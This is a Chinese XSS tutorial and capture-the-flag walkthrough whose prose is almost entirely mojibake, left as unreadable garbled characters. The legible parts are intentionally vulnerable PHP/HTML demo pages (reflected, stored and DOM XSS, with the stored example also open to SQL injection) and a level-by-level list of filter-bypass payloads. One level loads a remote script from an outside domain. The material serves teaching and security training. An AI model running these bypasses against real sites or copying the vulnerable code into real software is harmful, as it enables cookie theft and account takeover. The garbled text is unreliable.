æ˜¯å­˜å‚¨åœ¨æœåŠ¡å™¨ä¸­çš„ï¼Œå¦‚åœ¨ä¸ªäººä¿¡æ¯æˆ–å‘è¡¨æ–‡ç« ç­‰åœ°æ–¹ï¼Œæ’å…¥ä»£ç ï¼Œå¦‚æœæ²¡æœ‰è¿‡æ»¤æˆ–è¿‡æ»¤ä¸ä¸¥ï¼Œé‚£ä¹ˆè¿™äº›ä»£ç å°†å‚¨å­˜åˆ°æœåŠ¡å™¨ä¸­ï¼Œç”¨æˆ·è®¿é—®è¯¥é¡µé¢çš„æ—¶å€™è§¦å‘ä»£ç æ‰§è¡Œã€‚è¿™ç§XSSæ¯”è¾ƒå±é™©ï¼Œå®¹æ˜“é€ æˆè •è™«ï¼Œç›—çªƒcookieã€‚\n\nåå°„å‹XSSï¼š\nåå°„å‹XSSï¼ŒéæŒä¹…åŒ–ï¼Œéœ€è¦æ¬ºéª—ç”¨æˆ·è‡ªå·±å»ç‚¹é“¾æ¥æ‰èƒ½è§¦å‘XSSä»£ç ï¼ˆå¹¶æ²¡æœ‰å­˜å‚¨åœ¨æœåŠ¡å™¨ä¸­ï¼‰ï¼Œä¸€èˆ¬å®¹æ˜“å‡ºç°åœ¨æœç´¢é¡µé¢ã€‚åå°„å‹XSSå¤§å¤šæ•°ç”¨æ¥ç›—å–ç”¨æˆ·çš„Cookieã€‚\n\nDOMå‹XSSï¼š\nDOMå‹XSSï¼Œä¸ç»è¿‡åç«¯ï¼Œæ˜¯åŸºäºæ–‡æ¡£å¯¹è±¡æ¨¡å‹(Document Objeet Model,DOM)çš„ä¸€ç§æ¼æ´ï¼ŒDOM-XSSæ˜¯é€šè¿‡urlä¼ å…¥å‚æ•°å»æ§åˆ¶è§¦å‘çš„ï¼Œå…¶å®ä¹Ÿå±äºåå°„å‹XSSã€‚ DOMçš„è¯¦è§£ï¼šDOMæ–‡æ¡£å¯¹è±¡æ¨¡å‹\nå¯èƒ½è§¦å‘DOMå‹XSSçš„å±æ€§ï¼š\n\ndocument.refererwindow.namelocationinnerHTMLdocumen.write\n\nå¦‚å›¾ï¼Œæˆ‘ä»¬åœ¨URLä¸­ä¼ å…¥å‚æ•°çš„å€¼ï¼Œç„¶åå®¢æˆ·ç«¯é¡µé¢é€šè¿‡jsè„šæœ¬åˆ©ç”¨DOMçš„æ–¹æ³•è·å¾—URLä¸­å‚æ•°çš„å€¼ï¼Œå†é€šè¿‡DOMæ–¹æ³•èµ‹å€¼ç»™é€‰æ‹©åˆ—è¡¨ï¼Œè¯¥è¿‡ç¨‹æ²¡æœ‰ç»è¿‡åç«¯ï¼Œå®Œå…¨æ˜¯åœ¨å‰ç«¯å®Œæˆçš„ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬å°±å¯ä»¥åœ¨æˆ‘ä»¬è¾“å…¥çš„å‚æ•°ä¸Šåšæ‰‹è„šäº†ã€‚\n\nXSSçš„æ”»å‡»è½½è·ä»¥ä¸‹æ‰€æœ‰æ ‡ç­¾çš„ &gt; éƒ½å¯ä»¥ç”¨ // ä»£æ›¿ï¼Œ ä¾‹å¦‚ &lt;script&gt;alert(welcome)&lt;/script//\nscriptæ ‡ç­¾scriptæ ‡ç­¾æ˜¯æœ€ç›´æ¥çš„XSSæœ‰æ•ˆè½½è·ï¼Œè„šæœ¬æ ‡è®°å¯ä»¥å¼•ç”¨å¤–éƒ¨çš„JavaScriptä»£ç ï¼Œå¯ä»¥å°†ä»£ç æ’å…¥è„šæœ¬æ ‡è®°ä¸­\n\nsvgæ ‡ç­¾\nimgæ ‡ç­¾\nbodyæ ‡ç­¾\nvideoæ ‡ç­¾\nstyleæ ‡ç­¾\nXSSå¯ä»¥æ’åœ¨å“ªé‡Œï¼Ÿ\nÂ·ç”¨æˆ·è¾“å…¥ä½œä¸ºscriptæ ‡ç­¾å†…å®¹\nÂ·ç”¨æˆ·è¾“å…¥ä½œä¸ºHTMLæ³¨é‡Šå†…å®¹\nÂ·ç”¨æˆ·è¾“å…¥ä½œä¸ºHTMLæ ‡ç­¾çš„å±æ€§å\nÂ·ç”¨æˆ·è¾“å…¥ä½œä¸ºHTMLæ ‡ç­¾çš„å±æ€§å€¼\nÂ·ç”¨æˆ·è¾“å…¥ä½œä¸ºHTMLæ ‡ç­¾çš„åå­—\nÂ·ç›´æ¥æ’å…¥åˆ°CSSé‡Œ\ntips:æœ€é‡è¦çš„æ˜¯ï¼Œåƒä¸‡ä¸è¦å¼•å…¥ä»»ä½•ä¸å¯ä¿¡çš„ç¬¬ä¸‰æ–¹JavaScriptåˆ°é¡µé¢é‡Œï¼\n\n#ç”¨æˆ·è¾“å…¥ä½œä¸ºHTMLæ³¨é‡Šå†…å®¹ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥è¿›è¡Œé—­åˆç»•è¿‡&lt;!-- ç”¨æˆ·è¾“å…¥ --&gt;&lt;!-- --&gt;&lt;script&gt;alert(&#x27;hack&#x27;)&lt;/script&gt;&lt;!-- --&gt;#ç”¨æˆ·è¾“å…¥ä½œä¸ºæ ‡ç­¾å±æ€§åï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥è¿›è¡Œé—­åˆç»•è¿‡&lt;div ç”¨æˆ·è¾“å…¥=&quot;xx&quot;&gt;  &lt;/div&gt;&lt;div &gt;&lt;/div&gt;&lt;script&gt;alert(&#x27;hack&#x27;)&lt;/script&gt;&lt;div a=&quot;xx&quot;&gt; &lt;/div&gt;#ç”¨æˆ·è¾“å…¥ä½œä¸ºæ ‡ç­¾å±æ€§å€¼ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥è¿›è¡Œé—­åˆç»•è¿‡&lt;div id=&quot;ç”¨æˆ·è¾“å…¥&quot;&gt;&lt;/div&gt;&lt;div id=&quot;&quot;&gt;&lt;/div&gt;&lt;script&gt;alert(&#x27;hack&#x27;)&lt;/script&gt;&lt;div a=&quot;x&quot;&gt;&lt;/div&gt;#ç”¨æˆ·è¾“å…¥ä½œä¸ºæ ‡ç­¾åï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥è¿›è¡Œé—­åˆç»•è¿‡&lt;ç”¨æˆ·è¾“å…¥  id=&quot;xx&quot; /&gt;&lt;&gt;&lt;script&gt;alert(&#x27;hack&#x27;)&lt;/script&gt;&lt;b id=&quot;xx&quot; /&gt;#ç”¨æˆ·è¾“å…¥ä½œä¸ºCSSå†…å®¹ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥è¿›è¡Œé—­åˆç»•è¿‡&lt;style&gt;ç”¨æˆ·è¾“å…¥&lt;style&gt;&lt;style&gt; &lt;/style&gt;&lt;script&gt;alert(&#x27;hack&#x27;)&lt;/script&gt;&lt;style&gt; &lt;/style&gt;\n\nXSSæ¼æ´æŒ–æ˜é»‘ç›’æµ‹è¯•å°½å¯èƒ½æ‰åˆ°ä¸€åˆ‡ç”¨æˆ·å¯æ§å¹¶ä¸”èƒ½å¤Ÿè¾“å‡ºåœ¨é¡µé¢ä»£ç ä¸­çš„åœ°æ–¹ï¼Œæ¯”å¦‚ï¼š\n\nÂ·urlçš„æ¯ä¸€ä¸ªå‚æ•°\nÂ·urlæœ¬èº«\nÂ·è¡¨å•\nÂ·æœç´¢æ¡†\n\nå¸¸è§ä¸šåŠ¡åœºæ™¯\n\nÂ·é‡ç¾åŒºï¼šè¯„è®ºåŒºã€ç•™è¨€åŒºã€ä¸ªäººä¿¡æ¯ã€è®¢å•ä¿¡æ¯ç­‰ã€‚\nÂ·é’ˆå¯¹æ€§ï¼šç«™å†…ä¿¡ã€ç½‘é¡µå³æ—¶é€šè®¯ã€ç§ä¿¡ã€æ„è§åé¦ˆç­‰ã€‚\nÂ·å­˜åœ¨é£é™©ï¼šæœç´¢æ¡†ã€å½“å‰ç›®å½•ã€å›¾ç‰‡å±æ€§ç­‰ã€‚\n\nç™½ç›’æµ‹è¯•ï¼ˆä»£ç å®¡è®¡ï¼‰å…³äºXSSçš„ä»£ç å®¡è®¡ä¸»è¦æ˜¯ä»æ¥æ‰‹å‚æ•°çš„åœ°æ–¹å’Œä¸€äº›å…³é”®è¯å…¥æ‰‹ã€‚\nPHPä¸­å¸¸è§çš„æ¥æ”¶å‚æ•°çš„æ–¹å¼æœ‰$_GETã€$_POSTã€$_REQUESTç­‰ï¼Œå¯ä»¥æœç´¢æ‰€æœ‰æ¥æ”¶å‚æ•°çš„åœ°æ–¹ã€‚ç„¶åå¯¹æ¥æ”¶çš„æ•°æ®è¿›è¡Œè·Ÿè¸ªï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰è¾“å‡ºåˆ°é¡µé¢ä¸­ï¼Œç„¶åçœ‹è¾“å‡ºåˆ°é¡µé¢ä¸­çš„æ•°æ®æ˜¯å¦è¿›è¡Œäº†è¿‡æ»¤å’ŒHTMLç¼–ç ç­‰å¤„ç†ã€‚\nä¹Ÿå¯ä»¥æœç´¢ç±»ä¼¼echoè¿™æ ·çš„è¾“å‡ºè¯­å¥ï¼Œè·Ÿè¸ªè¾“å‡ºçš„å˜é‡æ˜¯ä»å“ªé‡Œæ¥çš„ï¼Œæˆ‘ä»¬æ˜¯å¦èƒ½æ§åˆ¶ï¼Œå¦‚æœä»æ•°æ®åº“ä¸­å–å¾—ï¼Œæ˜¯å¦èƒ½æ§åˆ¶å­˜åˆ°æ•°æ®åº“ä¸­çš„æ•°æ®ï¼Œå­˜åˆ°æ•°æ®åº“ä¹‹å‰æœ‰æ— è¿‡æ»¤ç­‰ã€‚\nå¤§å¤šæ•°ç¨‹åºä¼šæ¥æ”¶å‚æ•°å°è£…åœ¨å…¬æ–‡æ–‡ä»¶çš„å‡½æ•°ä¸­ç»Ÿä¸€è°ƒç”¨ï¼Œæˆ‘ä»¬éœ€è¦å®¡è®¡è¿™äº›å…¬å…±å‡½æ•°æœ‰æ²¡æœ‰è¿‡æ»¤ï¼Œèƒ½å¦ç»•è¿‡ç­‰ã€‚\nXSSæ”»å‡»è¿‡ç¨‹åå°„å‹XSSæ¼æ´ï¼š\n\nAliceç»å¸¸æµè§ˆæŸä¸ªç½‘ç«™ï¼Œæ­¤ç½‘ç«™ä¸ºBobæ‰€æ‹¥æœ‰ã€‚Bobçš„ç«™ç‚¹éœ€è¦Aliceä½¿ç”¨ç”¨æˆ·å/å¯†ç è¿›è¡Œç™»å½•ï¼Œå¹¶å­˜å‚¨äº†Aliceæ•æ„Ÿä¿¡æ¯(æ¯”å¦‚é“¶è¡Œå¸æˆ·ä¿¡æ¯)ã€‚\nTom å‘ç° Bobçš„ç«™ç‚¹å­˜åœ¨åå°„æ€§çš„XSSæ¼æ´\nTom åˆ©ç”¨Bobç½‘ç«™çš„åå°„å‹XSSæ¼æ´ç¼–å†™äº†ä¸€ä¸ªexpï¼Œåšæˆé“¾æ¥çš„å½¢å¼ï¼Œå¹¶åˆ©ç”¨å„ç§æ‰‹æ®µè¯±ä½¿Aliceç‚¹å‡»\nAliceåœ¨ç™»å½•åˆ°Bobçš„ç«™ç‚¹åï¼Œæµè§ˆäº† Tom æä¾›çš„æ¶æ„é“¾æ¥\nåµŒå…¥åˆ°æ¶æ„é“¾æ¥ä¸­çš„æ¶æ„è„šæœ¬åœ¨Aliceçš„æµè§ˆå™¨ä¸­æ‰§è¡Œã€‚æ­¤è„šæœ¬ç›—çªƒæ•æ„Ÿä¿¡æ¯(cookieã€å¸å·ä¿¡æ¯ç­‰ä¿¡æ¯)ã€‚ç„¶ååœ¨Aliceå®Œå…¨ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹å°†è¿™äº›ä¿¡æ¯å‘é€ç»™ Tomã€‚\nTom åˆ©ç”¨è·å–åˆ°çš„cookieå°±å¯ä»¥ä»¥Aliceçš„èº«ä»½ç™»å½•Bobçš„ç«™ç‚¹ï¼Œå¦‚æœè„šæœ¬çš„åŠŸæ›´å¼ºå¤§çš„è¯ï¼ŒTom è¿˜å¯ä»¥å¯¹Aliceçš„æµè§ˆå™¨åšæ§åˆ¶å¹¶è¿›ä¸€æ­¥åˆ©ç”¨æ¼æ´æ§åˆ¶\n\n\nå­˜å‚¨å‹XSSæ¼æ´ï¼š\n\nBobæ‹¥æœ‰ä¸€ä¸ªWebç«™ç‚¹ï¼Œè¯¥ç«™ç‚¹å…è®¸ç”¨æˆ·å‘å¸ƒä¿¡æ¯/æµè§ˆå·²å‘å¸ƒçš„ä¿¡æ¯ã€‚\nTomæ£€æµ‹åˆ°Bobçš„ç«™ç‚¹å­˜åœ¨å­˜å‚¨å‹çš„XSSæ¼æ´ã€‚\nTomåœ¨Bobçš„ç½‘ç«™ä¸Šå‘å¸ƒä¸€ä¸ªå¸¦æœ‰æ¶æ„è„šæœ¬çš„çƒ­ç‚¹ä¿¡æ¯ï¼Œè¯¥çƒ­ç‚¹ä¿¡æ¯å­˜å‚¨åœ¨äº†Bobçš„æœåŠ¡å™¨çš„æ•°æ®åº“ä¸­ï¼Œç„¶åå¸å¼•å…¶å®ƒç”¨æˆ·æ¥é˜…è¯»è¯¥çƒ­ç‚¹ä¿¡æ¯ã€‚\nBobæˆ–è€…æ˜¯ä»»ä½•çš„å…¶ä»–äººå¦‚Aliceæµè§ˆè¯¥ä¿¡æ¯ä¹‹å,Tomçš„æ¶æ„è„šæœ¬å°±ä¼šæ‰§è¡Œã€‚\nTomçš„æ¶æ„è„šæœ¬æ‰§è¡Œåï¼ŒTomå°±å¯ä»¥å¯¹æµè§ˆå™¨è¯¥é¡µé¢çš„ç”¨æˆ·å‘åŠ¨ä¸€èµ·XSSæ”»å‡»\n\n\nXSSæ¼æ´çš„å±å®³\nXSSæ¼æ´ç®€å•æ”»å‡»æµ‹è¯•æºç åå°„å‹//å‰ç«¯ 1.htmlï¼š&lt;html&gt;&lt;head lang=&quot;en&quot;&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;åå°„å‹XSS&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;form action=&quot;action.php&quot; method=&quot;post&quot;&gt;        &lt;input type=&quot;text&quot; name=&quot;name&quot; /&gt;        &lt;input type=&quot;submit&quot; value=&quot;æäº¤&quot;&gt;    &lt;/form&gt;&lt;/body&gt;&lt;/html&gt;//åç«¯ action.phpï¼š&lt;?php    $name=$_POST[&quot;name&quot;]; \techo $name;?&gt;\n\n è¿™é‡Œæœ‰ä¸€ä¸ªç”¨æˆ·æäº¤çš„é¡µé¢ï¼Œç”¨æˆ·å¯ä»¥åœ¨æ­¤æäº¤æ•°æ®ï¼Œæ•°æ®æäº¤ä¹‹åç»™åå°å¤„ç†\næ‰€ä»¥ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨è¾“å…¥æ¡†ä¸­æäº¤æ•°æ®ï¼š &lt;script&gt;alert(&#39;hack&#39;)&lt;/script&gt; \né¡µé¢ç›´æ¥å¼¹å‡ºäº†hackçš„é¡µé¢ï¼Œå¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬æ’å…¥çš„è¯­å¥å·²ç»è¢«é¡µé¢ç»™æ‰§è¡Œäº†ã€‚è¿™å°±æ˜¯æœ€åŸºæœ¬çš„åå°„å‹çš„XSSæ¼æ´ï¼Œè¿™ç§æ¼æ´æ•°æ®æµå‘æ˜¯ï¼š å‰ç«¯--&gt;åç«¯--&gt;å‰ç«¯\nå­˜å‚¨å‹//å‰ç«¯ï¼š2.html&lt;html&gt;&lt;head lang=&quot;en&quot;&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;å­˜å‚¨å‹XSS&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;form action=&quot;action2.php&quot; method=&quot;post&quot;&gt;        è¾“å…¥ä½ çš„IDï¼š  &lt;input type=&quot;text&quot; name=&quot;id&quot; /&gt; &lt;br/&gt;        è¾“å…¥ä½ çš„Nameï¼š&lt;input type=&quot;text&quot; name=&quot;name&quot; /&gt; &lt;br/&gt;        &lt;input type=&quot;submit&quot; value=&quot;æäº¤&quot;&gt;    &lt;/form&gt;&lt;/body&gt;&lt;/html&gt;//åç«¯ï¼šaction2.php&lt;?php\t$id=$_POST[&quot;id&quot;];\t$name=$_POST[&quot;name&quot;];\tmysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;);\tmysql_select_db(&quot;test&quot;);\t\t$sql=&quot;insert into xss value ($id,&#x27;$name&#x27;)&quot;;\t$result=mysql_query($sql);?&gt;//ä¾›å…¶ä»–ç”¨æˆ·è®¿é—®é¡µé¢ï¼šshow2.php&lt;?php\tmysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;);\tmysql_select_db(&quot;test&quot;);\t$sql=&quot;select * from xss where id=1&quot;;\t$result=mysql_query($sql);\twhile($row=mysql_fetch_array($result))&#123;\t\techo $row[&#x27;name&#x27;];\t&#125;?&gt;\n\nè¿™é‡Œæœ‰ä¸€ä¸ªç”¨æˆ·æäº¤çš„é¡µé¢ï¼Œæ•°æ®æäº¤ç»™åç«¯ä¹‹åï¼Œåç«¯å­˜å‚¨åœ¨æ•°æ®åº“ä¸­ã€‚ç„¶åå½“å…¶ä»–ç”¨æˆ·è®¿é—®å¦ä¸€ä¸ªé¡µé¢çš„æ—¶å€™ï¼Œåç«¯è°ƒå‡ºè¯¥æ•°æ®ï¼Œæ˜¾ç¤ºç»™å¦ä¸€ä¸ªç”¨æˆ·ï¼ŒXSSä»£ç å°±è¢«æ‰§è¡Œäº†ã€‚\næˆ‘ä»¬è¾“å…¥ 1  å’Œ &lt;script&gt;alert(\\&#39;hack\\&#39;)&lt;/script&gt;  ï¼Œæ³¨æ„ï¼Œè¿™é‡Œçš„hackçš„å•å¼•å·è¦è¿›è¡Œè½¬ä¹‰ï¼Œå› ä¸ºsqlè¯­å¥ä¸­çš„$nameæ˜¯å•å¼•å·çš„ï¼Œæ‰€ä»¥è¿™é‡Œä¸è½¬ä¹‰çš„è¯å°±ä¼šé—­åˆsqlè¯­å¥ä¸­çš„å•å¼•å·ã€‚ä¸ç„¶æ³¨å…¥ä¸è¿›å»ã€‚æäº¤äº†ä¹‹åï¼ŒXSSè¯­å¥å°±å·²ç»æ’å…¥åˆ°æ•°æ®åº“ä¸­ç„¶åå½“å…¶ä»–ç”¨æˆ·è®¿é—® show2.php é¡µé¢æ—¶ï¼Œæˆ‘ä»¬æ’å…¥çš„XSSä»£ç å°±æ‰§è¡Œäº†ã€‚å­˜å‚¨å‹XSSçš„æ•°æ®æµå‘æ˜¯ï¼šå‰ç«¯--&gt;åç«¯--&gt;æ•°æ®åº“--&gt;åç«¯--&gt;å‰ç«¯\nDOMå‹// å‰ç«¯3.html&lt;html&gt;&lt;head lang=&quot;en&quot;&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;DOMå‹XSS&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;form action=&quot;action3.php&quot; method=&quot;post&quot;&gt;        &lt;input type=&quot;text&quot; name=&quot;name&quot; /&gt;        &lt;input type=&quot;submit&quot; value=&quot;æäº¤&quot;&gt;    &lt;/form&gt;&lt;/body&gt;&lt;/html&gt;// åç«¯action3.php&lt;?php  $name=$_POST[&quot;name&quot;];?&gt;&lt;input id=&quot;text&quot; type=&quot;text&quot; value=&quot;&lt;?php echo $name; ?&gt;&quot;/&gt;&lt;div id=&quot;print&quot;&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot;&gt;  var text=document.getElementById(&quot;text&quot;);  var print=document.getElementById(&quot;print&quot;);  print.innerHTML=text.value;  // è·å– textçš„å€¼ï¼Œå¹¶ä¸”è¾“å‡ºåœ¨printå†…ã€‚è¿™é‡Œæ˜¯å¯¼è‡´xssçš„ä¸»è¦åŸå› ã€‚&lt;/script&gt;\n\nè¿™é‡Œæœ‰ä¸€ä¸ªç”¨æˆ·æäº¤çš„é¡µé¢ï¼Œç”¨æˆ·å¯ä»¥åœ¨æ­¤æäº¤æ•°æ®ï¼Œæ•°æ®æäº¤ä¹‹åç»™åå°å¤„ç†\næˆ‘ä»¬å¯ä»¥è¾“å…¥ &lt;img src=1 Î¿nerrÎ¿r=alert(&#39;hack&#39;)&gt;  \né¡µé¢ç›´æ¥å¼¹å‡ºäº† hack çš„é¡µé¢ï¼Œå¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬æ’å…¥çš„è¯­å¥å·²ç»è¢«é¡µé¢ç»™æ‰§è¡Œäº†ã€‚è¿™å°±æ˜¯DOMå‹XSSæ¼æ´ï¼Œè¿™ç§æ¼æ´æ•°æ®æµå‘æ˜¯ï¼š å‰ç«¯â€“&gt;æµè§ˆå™¨\nXSSåˆ·é¢˜ç¬”è®°è¿™ä¸€éƒ¨åˆ†æ˜¯https://xss.haozi.me/çš„wp\nè¿™é‡Œè¾¹ä¸»è¦è®­ç»ƒäº†ä¸€äº›XSSçš„ç®€å•é¢˜ç›®\n0x00å¸¸è§„é¢˜ç›®ï¼Œç›´æ¥&lt;script&gt;alert(1)&lt;/script&gt;ç»“æŸæˆ˜æ–—\næˆ–è€…&lt;img src=&quot;x&quot; onerror=&quot;alert(1)&quot;&gt;\n(ä¸‹è¿°é¢˜ç›®ä¸¤ç§æ–¹å¼å‡å¯äº’æ¢ï¼Œä¸å†ä¸€ä¸€è¯´æ˜)\n0x01å…ˆæ¥ä¸ª&lt;/textarea&gt;ä¸å‰è¾¹çš„&lt;textarea&gt;é—­åˆï¼Œç„¶åå†&lt;script&gt;alert(1)&lt;/script&gt;\nå½“ç„¶ä½ ä¹Ÿå¯ä»¥ç”¨ä¸€ä¸ªæ ‡ç­¾ç»“æŸæˆ˜æ–—&lt;/textarea&gt;&lt;img src=&quot;x&quot; onerror=&quot;alert(1)&quot;&gt;&lt;textarea&gt;\n0x02å…ˆæ¥ä¸ª&quot;&gt;ä¸å‰è¾¹çš„&quot;åŠ&lt;é—­åˆï¼Œç„¶åå†&lt;script&gt;alert(1)&lt;/script&gt;\nåŒæ ·ï¼Œå¯ä»¥ä¸€ä¸ªæ ‡ç­¾ç»“æŸ&quot;&gt;&lt;img src=&quot;x&quot; onerror=&quot;alert(1)&quot;&gt;\n0x03åç«¯ä»£ç æ¥çœ‹ï¼Œè¿‡æ»¤äº†()\næˆ‘ä»¬å¯ä»¥ç”¨``ä»£æ›¿\n\næˆ–è€…æ˜¯&lt;img src=&quot;x&quot; onerror=&quot;alert1&quot;&gt;\n0x04è¿™é¢˜è¿‡æ»¤äº†()å’Œ``\nè€ƒè™‘ä½¿ç”¨HTML\nè¿™é¢˜è€ƒè™‘HTMLç¼–ç ç»•è¿‡ï¼Œæ¥åˆ°è¿™é‡Œ\n\næˆ‘ä»¬éœ€è¦ç”¨svgæ ‡ç­¾å¯ä»¥ç›´æ¥æ‰§è¡ŒHTMLå®ä½“å­—ç¬¦\næ‰€ä»¥ç­”æ¡ˆä¸º&lt;svg&gt;&lt;script&gt;alert&amp;#40;&amp;#49;&amp;#41;&lt;/script&gt;&lt;/svg&gt;æˆ–è€…&lt;img src=&quot;x&quot; onerror=&quot;alert&amp;#40;1&amp;#41;&quot;&gt;\n0x05å¹¶ä¸æ˜¯åªè¦--&gt;æ‰èƒ½é—­åˆ&lt;!--,--!&gt;ä¹Ÿèƒ½é—­åˆï¼Œç›´æ¥é—­åˆä¸€ä¸‹ï¼Œç„¶åå°±å¥½äº†--!&gt;&lt;img src=&quot;x&quot; onerror=&quot;alert(1)&quot;&gt;\n\n0x06æ­¤å…³æ˜¯å°†æ‰€æœ‰ä»¥autoæˆ–è€…onå¼€å¤´çš„ä¸”ä»¥=æˆ–&gt;ç»“å°¾çš„å±æ€§æ›¿æ¢æˆ_åç›´æ¥è¾“å‡ºï¼Œä¸”åŒ¹é…æ˜¯ä¸è€ƒè™‘å¤§å°å†™\næ‰€ä»¥è¿‡æ»¤äº†autofocuså’Œonerrorã€onmousemoveäº‹ä»¶, ä»¥åŠé˜²æ­¢inputæ ‡ç­¾è¢«é—­åˆ\nè¿™é‡ŒæŸ¥åˆ°å¯ä»¥ä½¿ç”¨æ¢è¡Œç¬¦æ¥ç»•è¿‡ï¼Œå› ä¸ºJavascripté€šå¸¸ä»¥åˆ†å·ç»“å°¾ï¼Œå¦‚æœè§£æå¼•æ“èƒ½ç¡®å®šä¸€ä¸ªè¯­å¥æ—¶å®Œæ•´çš„ï¼Œä¸”è¡Œå°¾æœ‰æ¢è¡Œç¬¦ï¼Œåˆ™åˆ†å·å¯çœç•¥,è€Œå¦‚æœä¸æ˜¯å®Œæ•´çš„è¯­å¥ï¼Œjavascriptåˆ™ä¼šç»§ç»­å¤„ç†ï¼Œç›´åˆ°è¯­å¥å®Œæ•´ç»“æŸæˆ–åˆ†å·\n0x07æ­¤å…³æ˜¯å¯¹äºä»¥&lt;/å¼€å¤´åæ¥ä»»æ„0ä¸ªæˆ–1ä¸ªé&gt;å­—ç¬¦ä¸”ä»¥&gt;ç»“å°¾çš„å­—ç¬¦ä¸²è¿›è¡Œè¿‡æ»¤ï¼Œä¸”ä¸è€ƒè™‘å¤§å°å†™ï¼Œå³è¿‡æ»¤äº†ä»¥&lt;&gt;åŒ…è£¹çš„æ ‡ç­¾\nç”±äºhtmlçš„å®¹é”™æ€§å¾ˆé«˜ï¼Œå¯¹äºæ ‡ç­¾ä¸é—­åˆä¹Ÿå¯ä»¥æ¥å—(ç½‘ä¸Šè¯´è¿™åªæ˜¯html4æ—¶çš„æ— å°¾æ ‡ç­¾ç‰¹æ€§ï¼Œè€Œhtml5æ—¶å°±å°†å…¶å»é™¤äº†ï¼Œä¸çŸ¥é“ä¸ºå•¥è¿™é‡Œè¿˜èƒ½æ‰§è¡ŒæˆåŠŸ)ï¼Œè¿™é‡Œå°±ç›´æ¥ä½¿ç”¨ä¸é—­åˆçš„è¯­å¥å°±èƒ½æˆåŠŸå¼¹çª—\n\n0x08è¿™é¢˜æŠŠ&lt;/style&gt;æ›¿æ¢äº†ï¼Œä¹Ÿå°±æ˜¯è¿‡æ»¤äº†ï¼Œå…¶å®è¿˜æ˜¯ç¬¬äº”é¢˜è€ƒç‚¹ï¼Œæ¢è¡Œç»•è¿‡å°±è¡Œ\n\n0x09è¿™å…³æ²¡æœ‰åšé»‘åå•ï¼Œåè€Œåšäº†ç™½åå•\n\n0x10æˆ‘é‡‡ç”¨äº†æœ€åŸå§‹çš„æ–¹æ³•ï¼Œé—­åˆæ ‡ç­¾\n\nçœ‹åˆ«äººçš„blogï¼Œæœ‰ç®€å•æ–¹æ³•ï¼Œå¥½å§è¿˜æ˜¯æˆ‘HTMLä¸å¦‚å¤§ä½¬äº†\n\n0x11â€œè¢«æ›¿æ¢æˆäº†/â€œï¼Œå¹¶æ²¡æœ‰ä»€ä¹ˆç”¨å•Šï¼Œè¿˜æ˜¯å¯ä»¥é—­åˆ\n\n //è™½ç„¶è¢«è½¬ä¹‰æˆäº†//, ä½†è½¬ä¹‰ä¹‹åè¿˜æ˜¯//, åœ¨jsä¸­è¿˜æ˜¯æ³¨é‡Šç¬¦ \n0x12åœ¨æˆ‘çœ‹æ¥å†…åµŒä¸€ä¸ªæ ‡ç­¾æ˜¯æœ€ç®€å•ç²—æš´çš„æ–¹æ³•ï¼Œåªè¦&lt;&gt; æ²¡æœ‰è¢«è¿‡æ»¤å°±å¥½\n\nå½“ç„¶ä¹Ÿå¯ä»¥æƒ³åŠæ³•ç»•è¿‡ï¼Œé—­åˆä¸€ä¸‹ï¼Œâ€è¢«æ›¿æ¢æˆ\\â€œ ï¼Œæ€ä¹ˆåŠï¼Ÿ\nè¯­æ–‡ä¸Šæœ‰åŒé‡å¦å®šè¡¨ç¤ºè‚¯å®šï¼Œæ•°å­¦ä¸Šæœ‰è´Ÿè´Ÿå¾—æ­£ï¼Œé‚£ä¹ˆ\n\n0x0Aè¿™åˆç”¨åˆ°ä¸€ä¸ªçŸ¥è¯†ç‚¹ï¼Œå°±æ˜¯@ï¼Œå¦‚æœä½ è®¿é—® www.baidu.com@www.google.comï¼Œé‚£ä¹ˆä½ æœ€åè¿›å…¥çš„æ˜¯è°·æ­Œçš„ç•Œé¢ï¼Œæ‰€ä»¥è¿™ä¸€å…³ï¼Œå°±åœ¨è‡ªå·±çš„æœåŠ¡å™¨ä¸Šæ”¾ä¸€ä¸ªjsæ–‡ä»¶ï¼Œå†™ä¸Šalert(1);è¿™é‡Œä½ å¯ä»¥ç”¨æˆ‘çš„charmersix.icu/xss.jsæˆ‘çœ‹é¢˜ç›®ä½œè€…çš„åº“é‡Œä¹Ÿç•™äº†ä¸ªï¼Œä¹Ÿå¯ä»¥ç”¨ä½œè€…çš„http://xss.haozi.me/j.js\nè¿™é‡Œåˆšå¼€å§‹åœ¨chromeä¸Šæ­»æ´»æ‰“ä¸é€šï¼Œä½†æ˜¯æ¢åˆ°Firefoxå°±å¥½äº†ï¼Œedgeä¹Ÿæ‰“ä¸é€š\n\n0x0Bæ­¤å…³ä½¿ç”¨toUpperCaseå‡½æ•°å¯¹äºè¾“å…¥è¿›è¡Œäº†è½¬æˆå¤§å†™çš„æ“ä½œ\nå¯¹äºå¤§å°å†™çš„é—®é¢˜ï¼Œhtml æ ‡ç­¾, åŸŸå ä¸åŒºåˆ†å¤§å°å†™ï¼Œpathéƒ¨åˆ†åŒºåˆ†å¤§å°å†™ã€‚\nuniocdeç¼–ç ä¹Ÿå¯ä»¥è§£å†³ç»•è¿‡å¤§å°å†™,å› ä¸ºjsè§£æå™¨åœ¨å·¥ä½œæ—¶å›å¯¹unicodeå…ˆè¿›è¡Œè§£ç ï¼Œä¾‹å¦‚è¿™é‡Œä¼šè¢«å…ˆè§£ææˆalert(1)ä»è€Œå®ç°å¼¹çª—\nhtmlä¸­unicodeç¼–ç 